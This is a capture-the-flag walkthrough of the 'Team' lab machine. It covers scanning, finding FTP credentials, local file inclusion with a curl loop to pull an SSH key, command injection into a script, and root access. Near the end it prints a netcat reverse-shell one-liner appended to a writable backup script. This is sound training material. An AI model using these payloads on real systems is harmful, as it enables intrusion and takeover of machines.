## Team
---

#### Starting the machine 
![](/docs/images/team/team1.png)


#### Nmap Scan
```
nmap -sV -sC 10.10.182.107 -oA nmap/recon-team
```

![](/docs/images/team/team2.png)


#### Gobuster Scan
```
gobuster dir -u http://10.10.182.107 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/team  
```

![](/docs/images/team/team3.png)

Unfortunately there were no results on Gobuster


#### Looking at the hidden webpage

After some looking at the webpage, its just a default apache page. But the page source code indicates that there's something more.

![](/docs/images/team/team4.png)


After adding the team.thm link to the hosts file, a new page pops us at http://team.thm

![](/docs/images/team/team5.png)


#### Finding the next step

After some digging around and revealing nothing, it was time for another gobuster scan using the new webpage.

```gobuster dir -u http://team.thm -w /usr/share/wordlists/dirb/common.txt -o services/apache/gob-team-thm -x txt,php,html```

![](/docs/images/team/team6.png)

One thing that's revealed is the /robots.txt endpoint.

![](/docs/images/team/team7.png)

And there we go, a 'dale' is found. This is probably a username for something. 

Let's go back to the main directory to look around for more stuff.


#### /scripts endpoint

I forgot to originally check the /scripts folder for more content, so I'll do that now.

```gobuster dir -u http://team.thm/scripts -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o services/apache/gob-team-thm-scripts -x txt,php,html,js 
```


![](/docs/images/team/team8.png)

I can see that there's a script.txt file inside the /scripts endpoint.

Let's see if we can pull it out. 

![](/docs/images/team/team9.png)

So this is it, some credentials were redacted (not by me that's actually the box).

And there is an older version of the script, presumably. I'm just gonna go out on limb and try script.txt.old and script.old.

![](/docs/images/team/team10.png)

So script.old was the previous script.

![](/docs/images/team/team11.png)

And it gives some more information about the ftp user. 


#### FTP 

![](/docs/images/team/team12.png)

The only obvious file available was the 'New_site.txt' file, so that could be downloaded into the local system.


![](/docs/images/team/team13.png)

The file indicates that a ".dev" domain can be found on the host and to put your id_rsa in the relevant config file. So a developement domain usually indicated vulnerabilities and the id_rsa tells us that there is an potentiall ssh connection to be made. 


#### Admin Page - User Flag

After adding dev.team.thm to the hosts, it can be accessed.

![](/docs/images/team/team14.png)

From here, there is a single link connecting directly to the teamshare.


![](/docs/images/team/team15.png)

Just by looking at the URL, a potential directory traversal could be possible.

![](/docs/images/team/team16.png)

I'm pretty lazy but we got the user flag which is nice. 


#### Persistence

Next step is to escalate our privileges. The text file did mention the id_rsa keys, I'm going to be using a quick LFI script that I actually stole from another writeup. 

```sh
while IFS="" read -r p || [ -n "$p" ]
do
  printf '%s\n' "$p"
  curl 'http://dev.team.thm/script.php?page='"$p"
done < /usr/share/wordlists/lfi-small.txt
```

![](/docs/images/team/team17.png)


This then give Dales OpenSSH key with the /etc/ssh/sshd_config path.

![](/docs/images/team/team18.png)

After configuring it, we now have SSH privileges.

![](/docs/images/team/team19.png)

So this looks like a standard SUID binary to gain priv esc.


#### Lateral Movement

So this script has an error inside of it that allows for command to be executed by the gyles user. When entering the date, the "bin/bash -i" string can be used to gain a weird shell with no output. Then this is just upgraded to a python shell using the legendary one-liner:

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


![](/docs/images/team/team22.png)

I did mess up in this one by trying to go back but I got the gyles shell. 

This is a result of the intentionally flawed scripting, the name parameter is written directly to the file. But the date, however, is inputted as a command in the "$error 2> /dev/null" line. This means that as long as the command is a valid one, it will run. Giving a shell as gyles using bash. 


#### Privilege Escalation

Of course I'm going to use LinPeas now that it's OSCP allowed. 

![](/docs/images/team/team23.png)

So here a file called /main_backup.sh can be accessed as an admin group.

![](/docs/images/team/team24.png)

Back to SUIDing then.


For this one, since it's actually writeable, a separate shell can be spawned by appending the a nc script. 

![](/docs/images/team/team27.png)

I'm gonna use this one since it hasn't failed me yet.


```
mkfifo /tmp/p; nc <LHOST> <LPORT> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p
```

![](/docs/images/team/team28.png)

We should have a nc shell now.

![](/docs/images/team/team29.png)

There we go, root shell obtained. 